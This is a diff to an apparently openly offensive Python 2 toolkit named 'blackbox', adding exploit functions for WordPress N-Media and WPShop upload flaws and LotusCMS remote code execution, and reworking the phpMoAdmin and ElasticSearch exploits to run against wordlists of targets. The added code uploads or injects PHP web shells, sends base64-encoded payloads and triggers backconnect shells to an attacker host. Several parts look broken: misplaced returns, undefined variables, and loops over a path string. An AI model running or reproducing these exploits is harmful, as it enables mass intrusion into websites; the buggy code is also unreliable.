@@ -7,6 +7,7 @@
 ### PRESTASHOP EXPLOIT : http://0day.today/exploit/25260 , http://0day.today/exploit/25261 , http://0day.today/exploit/25259 ###
 ### ADMIN PAGE FINDER  : https://packetstormsecurity.com/files/112855/Admin-Page-Finder-Script.html                          ###
 ### XSS/SQLI/RCE SCANNER FROM : https://github.com/zigoo0/webpwn3r !                                                         ###
+### EXPLOIT                   : https://github.com/XiphosResearch                                                            ###
 ################################################################################################################################
 import requests,json,sys,time,re,os,base64 ,random,hashlib,timeit,ftplib,pexpect,urllib2,urllib
 from sys import platform
@@ -37,17 +38,19 @@ def __help__():
 	print (color.BOLD+color.Y+"Bruteforcing : "+color.ENDC)
 	print (color.W+"\t+ Wordpress Bruteforce : wordpress_brute | Bruteforcing WP PANEL")
 	print (color.W+"\t+ Admin Page Finder    : admin_brute     | Find Admin Page")
-	#print (color.W+"\t+ PMA Page Finder       : pma_brute              | Find PhpMyAdmin Page")
 	print (color.W+"\t+ SSH Bruteforce       : ssh_brute       | Bruteforcing SSH LOGIN")
 	print (color.W+"\t+ FTP Bruteforce       : ftp_brute       | Bruteforcing FTP LOGIN")
 	print (color.W+color.BOLD+color.Y+"Information Gathering : "+color.ENDC)
 	print (color.W+"\t+ Dnsinfo : dns_info               | Get All Website from IP")
 	print (color.W+color.BOLD+color.Y+"Exploit : "+color.ENDC)
-	print (color.W+"\t+ Joomla Rce         : rce_joomla       | 1.5 - 3.4.5 remote code execution")
-	print (color.W+"\t+ Magento Rce        : rce_magento      | Magento eCommerce - Remote Code Execution")
-	print (color.W+"\t+ PrestaShop Exploit : presta_exploit   | Prestashop Multi Modules Arbitrary File Upload Exploit")
-	print (color.W+"\t+ PhpmoAdmin Rce     : rce_pmo          | Exploit for phpMoAdmin, CVE-2015-2208")
-	print (color.W+"\t+ ElasticSearch rce  : rce_elastic      | Exploit for ElasticSearch , {CVE-2015-1427}")
+	print (color.W+"\t+ Joomla Rce           : rce_joomla       | 1.5 - 3.4.5 remote code execution")
+	print (color.W+"\t+ Magento Rce          : rce_magento      | Magento eCommerce - Remote Code Execution")
+	print (color.W+"\t+ PrestaShop Exploit   : presta_exploit   | Prestashop Multi Modules Arbitrary File Upload Exploit")
+	print (color.W+"\t+ PhpmoAdmin Rce       : rce_pmo          | Exploit for phpMoAdmin, {CVE-2015-2208")
+	print (color.W+"\t+ ElasticSearch rce    : rce_elastic      | Exploit for ElasticSearch , {CVE-2015-1427}")
+	print (color.W+"\t+ LotusCMS Rce         : rce_lotus        | LotusCMS 3.0 Unauthenticated Remote Code Execution")
+	print (color.W+"\t+ WPNmedia upload vuln : wp_nmedia        | Wordpress N-Media Website Contact Form with File Upload 1.3.4")
+	print (color.W+"\t+ WPSHOP upload vuln   : wp_shop          | Wordpress WPShop eCommerce Shell Upload (WPVDB-7830)")
 	print (color.W+color.BOLD+color.Y+"Dorking : "+color.ENDC)
 	print (color.W+"\t+ Google Dorker : google_dorker(LFI/RCE/XSS/SQLi) | Google Dorker ")
 	print (color.W+"\t+ Bing Dorker   : bing_dorker(LFI/RCE/XSS/SQLi)   | Bing Dorker via IP")
@@ -582,6 +585,119 @@ class BruteForce:
 ####################################
 
 class exploit:
+	def wp_nmedia(self, target, host, port):
+		def php_encoder():
+			f = open("/opt/blackbox/payload/pmo.php", "r").read()
+			f = f.replace("<?php", "")
+			f = f.replace("?>", "")
+			encoded = f.encode('base64')
+			encoded = encoded.replace("\n", "")
+			encoded = encoded.strip()
+			code = "eval(base64_decode('%s'));" %(encoded)
+			return code
+		def shell_upload(url):
+			target_url = url + "/wp-admin/admin-ajax.php"
+			try:
+				print "\x1b[1;32m{+} Using target URL of: %s\x1b[0m" %(target_url)    
+				data = {"action": "upload", "action": "nm_webcontact_upload_file"}
+				r = requests.post(url=target_url, data=data, files={"Filedata":("pwn.php", "<?php @assert(filter_input(0,woot,516)); ?>")})
+			except Exception, e:
+				sys.exit("\x1b[1;31m{-} Exception hit, printing stack trace...\n%s\x1b[0m" %(str(e)))
+				if r.text:
+					return r.text.strip()
+				else:
+					sys.exit("\x1b[1;31m{-} Something fucked up... Our shell was not uploaded :/\x1b[0m")
+		def spawn_backconnect(shell_url, payload, host, port):
+			cookies = {'host': host, 'port': port}
+			data = {'woot': payload}
+			headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0'}
+			try:
+				print "\x1b[1;32m{*} Sending our payload...\x1b[0m"
+				r = requests.post(url=shell_url, data=data, headers=headers, verify=False, cookies=cookies)
+			except Exception, e:
+				sys.exit("\x1b[1;31m{-} Exception hit, printing stack trace...\n%s\x1b[0m" %(str(e)))
+			if r.text:
+				print r.text
+		def pop_shell(target, code, host, port):
+			shell_key = shell_upload(url=target)
+			shell_dict = json.loads(shell_key)
+			shell_name = shell_dict['filename']
+			shell_url = "%s/wp-content/uploads/contact_files/%s" %(target, shell_name)
+			print "\x1b[1;32m{+} Our shell is at: %s\x1b[0m" %(shell_url)
+			try:
+				print "\x1b[1;36m{*} Sending Backconnect to %s:%s...\x1b[0m" %(host, port)
+				spawn_backconnect(shell_url=shell_url, payload=code, host=host, port=port)
+			except Exception, e:
+				sys.exit("\x1b[1;31m{-} Exception hit, printing stack trace...\n%s\x1b[0m" %(str(e)))
+		code=php_encoder()
+		pop_shell(target=target, code=code, host=host, port=port)
+	def wp_shop(self, target, code, cb_host, cb_port):
+		def php_encoder():
+			f = open("/opt/blackbox/payload/pmo.php", "r").read()
+			f = f.replace("<?php", "")
+			f = f.replace("?>", "")
+			encoded = f.encode('base64')
+			encoded = encoded.replace("\n", "")
+			encoded = encoded.strip()
+			code = "eval(base64_decode('%s'));" %(encoded)
+			return code
+		def shell_upload(url):
+			target_url = url + "/wp-content/plugins/wpshop/includes/ajax.php?elementCode=ajaxUpload"
+			try:
+				print "\x1b[1;32m{+} Using target URL of: %s\x1b[0m" %(target_url)    
+				r = requests.post(url=target_url, files={"wpshop_file":("test.php", "<?php @assert(filter_input(0,woot,516)); ?>")})
+			except Exception, e:
+				sys.exit("\x1b[1;31m{-} Exception hit, printing stack trace...\n%s\x1b[0m" %(str(e)))
+			if r.text:
+				return r.text.strip()
+			else:
+				sys.exit("\x1b[1;31m{-} Something fucked up... Our shell was not uploaded :/\x1b[0m")
+		def spawn_backconnect(shell_url, payload, cb_host, cb_port):
+			cookies = {'host': cb_host, 'port': cb_port}
+			data = {'woot': payload}
+			headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0'}
+			try:
+				print "\x1b[1;32m{*} Sending our payload...\x1b[0m"
+				r = requests.post(url=shell_url, data=data, headers=headers, verify=False, cookies=cookies)
+			except Exception, e:
+				sys.exit("\x1b[1;31m{-} Exception hit, printing stack trace...\n%s\x1b[0m" %(str(e)))
+			if r.text:
+				print r.text
+		def pop_shell(target, code, cb_host, cb_port):
+			shell_url = shell_upload(url=target)
+			print "\x1b[1;32m{+} Our shell is at: %s\x1b[0m" %(shell_url)
+			try:
+				print "\x1b[1;36m{*} Sending Backconnect to %s:%s...\x1b[0m" %(cb_host, cb_port)
+				spawn_backconnect(shell_url=shell_url, payload=code, cb_host=cb_host, cb_port=cb_port)
+			except Exception, e:
+				sys.exit("\x1b[1;31m{-} Exception hit, printing stack trace...\n%s\x1b[0m" %(str(e)))
+		pop_shell(target=target, code=code, cb_host=host, cb_port=port)
+
+	def lotuscms(self, target, cb_host, cbport):
+		def php_encoder():
+			f = open("/opt/blackbox/payload/lotuscms.php", "r").read()
+			f = f.replace("<?php", "")
+			f = f.replace("?>", "")
+			encoded = f.encode('base64')
+			encoded = encoded.replace("\n", "")
+			encoded = encoded.strip()
+			code = "eval(base64_decode('%s'));" %(encoded)
+			return code
+		def pop_shell(target, code, cb_host, cb_port):
+			cookies = {'host': cb_host, 'port': cb_port}
+			data = {'0': code}
+			headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0'}
+			stager = "/index.php?page=index%27%29%3B%24{eval($_POST[0])}%3B%23"
+			print "{+} Sending our payload..."
+			try:
+				r = requests.post(url=target+stager, data=data, headers=headers, verify=False, cookies=cookies)
+			except Exception, e:
+				sys.exit("[-] Exception hit! Printing:\n %s" %(str(e)))
+			if r.text:
+				print r.text.split("</html>")[1].rstrip()
+		code = php_encoder()
+		pop_shell(target,code, cb_host, cb_port)
+
 	def phpmoadmin(self, target, cb_host, cbport):
 		"""Exploit for phpMoAdmin, CVE-2015-2208"""
 		def php_encoder():
@@ -1293,29 +1409,84 @@ def __main__():
 			if wordlist:
 				exploit().magento(wordlist)
 		if (arg=="rce_pmo"):
-			pmo="blackbox rce_pmo --target/-t http://192.168.1.101/phpMoAdmin/index.php --lhost 192.168.1.5 --lport 80"
+			pmo="blackbox rce_pmo --wordlist/-w ~/Desktop/pmo.txt --lhost 192.168.1.5 --lport 80"
 			parser = OptionParser(usage=pmo)
-			parser.add_option("--target","-t",
-				help="Target link")
+			parser.add_option("--wordlist","-w",
+				help="path of target link")
 			parser.add_option("--lhost",
 				help="local HOST")
 			parser.add_option("--lport",
 				help="local PORT")
 			(options,args) = parser.parse_args()
-			target = options.target
+			wordlist = options.wordlist
 			lhost = options.lhost
 			lport = options.lport
-			if target and lhost and lport:
-				exploit().phpmoadmin(target, lhost, lport)
+			if wordlist and lhost and lport:
+				for i in wordlist:
+					i=i.strip()
+					exploit().phpmoadmin(i, lhost, lport)
 		if (arg=="rce_elastic"):
-			els="blackbox rce_elastic --target/-t elasticsearch.local"
+			els="blackbox rce_elastic --wordlist/-w ~/Desktop/elastic.txt"
 			parser = OptionParser(usage=els)
-			parser.add_option("--target","-t",
-				help="Target link")
+			parser.add_option("--wordlist","-w",
+				help="path of target link")
 			(options,args) = parser.parse_args()
 			target = options.target
-			if target:
-				exploit().elastic(target)
+			if wordlist and lhost and lport:
+				for i in wordlist:
+					i=i.strip()
+					exploit().elastic(target)
+		if (arg=="rce_lotus"):
+			lts="blackbox rce_lotus --wordlist/-w  ~/Desktop/lotuscms.txt --lhost 192.168.1.5 --lport 80"
+			parser = OptionParser(usage=lts)
+			parser.add_option("--wordlist","-w",
+				help="path of target link")
+			parser.add_option("--lhost",
+				help="local HOST")
+			parser.add_option("--lport",
+				help="local PORT")
+			(options,args) = parser.parse_args()
+			wordlist = options.wordlist
+			lhost = options.lhost
+			lport = options.lport
+			if wordlist and lhost and lport:
+				for i in wordlist:
+					i=i.strip()
+					exploit().lotuscms(i, lhost, lport)
+		if (arg=="wp_nmedia"):
+			lts="blackbox wp_nmedia --wordlist/-w ~/Desktop/wpfile.txt --lhost 192.168.1.5 --lport 80"
+			parser = OptionParser(usage=lts)
+			parser.add_option("--wordlist","-w",
+				help="path of target link")
+			parser.add_option("--lhost",
+				help="local HOST")
+			parser.add_option("--lport",
+				help="local PORT")
+			(options,args) = parser.parse_args()
+			wordlist = options.wordlist
+			lhost = options.lhost
+			lport = options.lport
+			if wordlist and lhost and lport:
+				for i in wordlist:
+					i=i.strip()
+					exploit().wp_nmedia(i, lhost, lport)
+		if (arg=="wp_shop"):
+			lts="blackbox wp_shop --wordlist/-w ~/Desktop/wpfile.txt --lhost 192.168.1.5 --lport 80"
+			parser = OptionParser(usage=lts)
+			parser.add_option("--wordlist","-w",
+				help="path of target link")
+			parser.add_option("--lhost",
+				help="local HOST")
+			parser.add_option("--lport",
+				help="local PORT")
+			(options,args) = parser.parse_args()
+			wordlist = options.wordlist
+			lhost = options.lhost
+			lport = options.lport
+			if wordlist and lhost and lport:
+				for i in wordlist:
+					i=i.strip()
+					exploit().wp_shop(i, lhost, lport)
 		if (arg=="google_dorker"):
 			gd_hp = color.W+color.BOLD+sys.argv[0]+' google_dorker -d/--dork="[DORK]" --level [NUMBER OF PAGE] --[LFI/RCE/XSS/SQLi!]\nExample: '+sys.argv[0]+' google_dorker --dork="php?id=" --level 10 '+color.ENDC
 			
